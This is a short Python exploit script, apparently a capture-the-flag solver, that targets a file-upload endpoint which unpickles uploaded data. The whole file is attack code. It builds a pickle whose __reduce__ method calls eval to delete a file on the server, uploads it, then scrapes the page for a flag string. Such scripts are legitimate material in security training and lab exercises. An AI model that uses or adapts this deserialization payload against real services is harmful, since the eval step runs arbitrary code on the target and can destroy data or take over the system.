# coding:utf-8
import requests
import sys

"""
@文件命名：XBOX-36
@使用方式: python 036.py url
@简述思路: 构造恶意 pickle 文件，上传触发 decoy.txt 删除，读取 flag.txt
"""


from io import BytesIO


def generate_pickle_bytes():
    import pickle

    class MaliciousPayload:
        def __reduce__(self):
            code = "__import__('os').remove('decoy.txt')"
            return (eval, (code,))

    payload = MaliciousPayload()
    buf = BytesIO()
    pickle.dump(payload, buf)
    buf.seek(0)
    return buf


def Scan(url):
    flag = ""
    try:
        pickle_bytes = generate_pickle_bytes()
        files = {"file": ("malicious.pickle", pickle_bytes)}
        r = requests.post(url, files=files)
        home = requests.get(url)
        flag_match = re.search(r"(FLAG\{.*?\}|flag\{.*?\})", home.text)
        if flag_match:
            flag = flag_match.group(0)
        else:
            flag = "未找到 flag，响应内容：" + home.text
    except Exception as e:
        print(e)
    return flag


if __name__ == "__main__":
    import re

    print(Scan(url=sys.argv[1]))
